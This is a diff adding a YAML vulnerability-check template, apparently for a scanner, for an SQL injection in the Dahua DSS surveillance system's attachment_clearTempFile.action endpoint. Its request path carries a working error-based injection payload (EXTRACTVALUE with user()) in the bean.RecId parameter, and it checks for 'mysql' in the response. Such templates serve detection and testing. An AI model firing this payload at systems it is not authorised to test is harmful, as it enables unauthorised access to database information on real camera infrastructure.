@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 大华DSS数字监控系统 attachment_clearTempFile.action SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1
+  headers:
+response1:
+  headers:
+  body: mysql
+  code: 200
+requests2:
+response2:
